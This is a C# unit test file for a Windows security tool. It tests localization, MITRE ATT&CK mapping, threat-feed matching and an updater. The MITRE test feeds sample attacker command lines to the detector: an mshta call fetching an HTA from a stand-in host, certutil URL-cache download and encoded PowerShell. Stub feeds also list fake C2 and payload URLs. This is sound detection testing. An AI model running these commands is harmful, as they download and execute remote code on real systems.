using System.Net;
using System.Text;
using Becetti.Security.Core.Models;
using Becetti.Security.Core.Services;

namespace Becetti.Security.Core.Tests;

public sealed class GlobalWaveFeaturesTests : IDisposable
{
    private readonly string _tempDir;

    public GlobalWaveFeaturesTests()
    {
        _tempDir = Path.Combine(Path.GetTempPath(), "becetti-global-tests-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(_tempDir);
    }

    public void Dispose()
    {
        try
        {
            if (Directory.Exists(_tempDir))
                Directory.Delete(_tempDir, recursive: true);
        }
        catch { }
    }

    // -------------------------------------------------------------------------
    //  #5: 6 Global Languages Embedded Catalog & Live Parity
    // -------------------------------------------------------------------------
    [Fact]
    public async Task Localization_AllSixGlobalLanguages_HaveFullKeyParityAndLiveSwitch()
    {
        var settings = new SettingsService(_tempDir);
        var loc = new LocalizationService(settings);

        var enKeys = loc.GetKeys(AppLanguage.English);
        Assert.True(enKeys.Count >= 400, $"Expected >= 400 keys, got {enKeys.Count}");

        foreach (var lang in new[]
        {
            AppLanguage.Arabic,
            AppLanguage.French,
            AppLanguage.Spanish,
            AppLanguage.German,
            AppLanguage.Turkish
        })
        {
            var keys = loc.GetKeys(lang);
            Assert.Equal(enKeys.Count, keys.Count);
        }

        await loc.SetLanguageAsync(AppLanguage.Spanish);
        Assert.Equal("es-ES", loc.Bcp47Tag);
        Assert.False(loc.IsRtl);
        Assert.Equal("Configuración", loc.Get("TitleSettings.Text"));

        await loc.SetLanguageAsync(AppLanguage.German);
        Assert.Equal("de-DE", loc.Bcp47Tag);
        Assert.Equal("Einstellungen", loc.Get("TitleSettings.Text"));

        await loc.SetLanguageAsync(AppLanguage.Turkish);
        Assert.Equal("tr-TR", loc.Bcp47Tag);
        Assert.Equal("Ayarlar", loc.Get("TitleSettings.Text"));
    }

    // -------------------------------------------------------------------------
    //  #1: MITRE ATT&CK Enterprise Framework Mapper & Computed Badges
    // -------------------------------------------------------------------------
    [Fact]
    public void MitreAttackMapper_CoversCatalogAndMapsAllFindingCategories()
    {
        var catalog = MitreAttackMapper.GetCatalog();
        Assert.True(catalog.Count >= 20);
        Assert.All(catalog, t =>
        {
            Assert.StartsWith("T", t.TechniqueId);
            Assert.False(string.IsNullOrWhiteSpace(t.Name));
            Assert.False(string.IsNullOrWhiteSpace(t.Tactic));
        });

        Assert.Equal("T1547.001", MitreAttackMapper.MapPersistence("HKCU Run Key").TechniqueId);
        Assert.Equal("T1053.005", MitreAttackMapper.MapPersistence("Scheduled Task").TechniqueId);
        Assert.Equal("T1543.003", MitreAttackMapper.MapPersistence("Windows Service").TechniqueId);
        Assert.Equal("T1546.003", MitreAttackMapper.MapPersistence("WMI Event Subscription").TechniqueId);

        Assert.Equal("T1059.001", MitreAttackMapper.MapScript("powershell.exe", "powershell -enc SQBFAFgA").TechniqueId);
        Assert.Equal("T1218.005", MitreAttackMapper.MapScript("mshta.exe", "mshta http://evil.test/a.hta").TechniqueId);
        Assert.Equal("T1105", MitreAttackMapper.MapScript("certutil.exe", "certutil -urlcache -f http://a/b").TechniqueId);

        Assert.Equal("T1486", MitreAttackMapper.MapYaraRule("Ransomware_WannaCry_Dropper").TechniqueId);
        Assert.Equal("T1555", MitreAttackMapper.MapYaraRule("InfoStealer_BrowserCreds").TechniqueId);
        Assert.Equal("T1574.001", MitreAttackMapper.MapDll(isUnsigned: true, isTempOrUserPath: true).TechniqueId);

        var p = new PersistenceEntry { Category = "Scheduled Task" };
        Assert.Equal("T1053.005", p.MitreTechniqueId);

        var s = new SuspiciousScriptEvent { ProcessName = "powershell.exe", CommandLine = "powershell -enc AAA" };
        Assert.Equal("T1059.001", s.MitreTechniqueId);

        var d = new ProcessDllInfo { IsSigned = false, ModulePath = @"C:\Users\alice\AppData\Local\Temp\evil.dll" };
        Assert.Equal("T1574.001", d.MitreTechniqueId);
    }

    // -------------------------------------------------------------------------
    //  #2: Global Open Threat Intelligence Feeds (abuse.ch)
    // -------------------------------------------------------------------------
    [Fact]
    public async Task ThreatFeedService_SyncsFeedsAndMatchesIpDomainAndHash()
    {
        var handler = new StubHttpHandler(req =>
        {
            var url = req.RequestUri?.ToString() ?? "";
            if (url.Contains("feodotracker"))
                return new HttpResponseMessage(HttpStatusCode.OK)
                {
                    Content = new StringContent("# Feodo comment\n198.51.100.42\n203.0.113.77\n", Encoding.UTF8)
                };
            if (url.Contains("urlhaus"))
                return new HttpResponseMessage(HttpStatusCode.OK)
                {
                    Content = new StringContent("# URLhaus\nhttps://malware-drop.example.org/payload.exe\nhttp://evil-c2.test:8080/a\n", Encoding.UTF8)
                };
            if (url.Contains("bazaar"))
                return new HttpResponseMessage(HttpStatusCode.OK)
                {
                    Content = new StringContent("# Bazaar\n" + new string('a', 64) + "\n", Encoding.UTF8)
                };
            return new HttpResponseMessage(HttpStatusCode.NotFound);
        });

        using var http = new HttpClient(handler);
        var svc = new ThreatFeedService(http, _tempDir);

        var res = await svc.SyncFeedsAsync();
        Assert.True(res.Success);
        Assert.NotNull(res.Value);
        Assert.Equal(2, res.Value!.C2IpCount);
        Assert.Equal(2, res.Value.MaliciousDomainCount);
        Assert.Equal(1, res.Value.MalwareHashCount);

        var ipHit = svc.Lookup("198.51.100.42");
        Assert.True(ipHit.IsMatch);
        Assert.Equal("T1071", ipHit.MitreTechniqueId);

        var domHit = svc.Lookup("malware-drop.example.org");
        Assert.True(domHit.IsMatch);

        var hashHit = svc.Lookup(new string('A', 64));
        Assert.True(hashHit.IsMatch);
        Assert.Equal("T1204", hashHit.MitreTechniqueId);

        var clean = svc.Lookup("8.8.8.8");
        Assert.False(clean.IsMatch);
    }

    // -------------------------------------------------------------------------
    //  #3: Live Outbound GeoIP Radar RFC1918 Classifier
    // -------------------------------------------------------------------------
    [Fact]
    public void OutboundRadarService_ClassifiesPrivateAndPublicIpsCorrectly()
    {
        Assert.True(OutboundRadarService.IsPrivateIp("127.0.0.1"));
        Assert.True(OutboundRadarService.IsPrivateIp("10.0.0.5"));
        Assert.True(OutboundRadarService.IsPrivateIp("192.168.1.20"));
        Assert.True(OutboundRadarService.IsPrivateIp("172.16.4.2"));
        Assert.True(OutboundRadarService.IsPrivateIp("::1"));

        Assert.False(OutboundRadarService.IsPrivateIp("1.1.1.1"));
        Assert.False(OutboundRadarService.IsPrivateIp("8.8.8.8"));
        Assert.False(OutboundRadarService.IsPrivateIp("198.51.100.42"));
    }

    // -------------------------------------------------------------------------
    //  #6: GitHub Releases Auto-Updater
    // -------------------------------------------------------------------------
    [Fact]
    public async Task AppUpdaterService_DetectsNewerGitHubReleaseAndMsixAsset()
    {
        const string json =
            "{" +
            "\"tag_name\":\"v2.5.0\"," +
            "\"name\":\"BECETTI SECURITY v2.5.0 Global Edition\"," +
            "\"html_url\":\"https://github.com/Ahmedbecett/BECETTI-SECURITY/releases/tag/v2.5.0\"," +
            "\"body\":\"Added MITRE ATT&CK, abuse.ch feeds, and 6 languages.\"," +
            "\"published_at\":\"2026-11-22T20:00:00Z\"," +
            "\"assets\":[{" +
            "\"name\":\"BECETTI-SECURITY_2.5.0.0_x64.msix\"," +
            "\"browser_download_url\":\"https://github.com/Ahmedbecett/BECETTI-SECURITY/releases/download/v2.5.0/BECETTI-SECURITY_2.5.0.0_x64.msix\"," +
            "\"size\":94000000" +
            "}]" +
            "}";

        var handler = new StubHttpHandler(_ => new HttpResponseMessage(HttpStatusCode.OK)
        {
            Content = new StringContent(json, Encoding.UTF8, "application/json")
        });

        using var http = new HttpClient(handler);
        var updater = new AppUpdaterService(http);

        var check = await updater.CheckForUpdatesAsync("1.0.0.85");
        Assert.True(check.Success);
        Assert.NotNull(check.Value);
        Assert.True(check.Value!.IsUpdateAvailable);
        Assert.Equal("2.5.0", check.Value.LatestVersion);
        Assert.EndsWith(".msix", check.Value.MsixDownloadUrl);
        Assert.Equal(94_000_000L, check.Value.MsixSizeBytes);
    }

    // -------------------------------------------------------------------------
    //  #8: Windows Privacy & Anti-Telemetry Hardener
    // -------------------------------------------------------------------------
    [Fact]
    public async Task WindowsPrivacyHardenerService_HandlesAuditCleanlyAcrossPlatforms()
    {
        var svc = new WindowsPrivacyHardenerService();
        var audit = await svc.AuditAsync();
        if (OperatingSystem.IsWindows())
        {
            Assert.True(audit.Success);
            Assert.NotNull(audit.Value);
            Assert.Equal(6, audit.Value!.Count);
        }
        else
        {
            Assert.False(audit.Success);
        }
    }

    private sealed class StubHttpHandler : HttpMessageHandler
    {
        private readonly Func<HttpRequestMessage, HttpResponseMessage> _factory;
        public StubHttpHandler(Func<HttpRequestMessage, HttpResponseMessage> factory) => _factory = factory;

        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
            => Task.FromResult(_factory(request));
    }
}
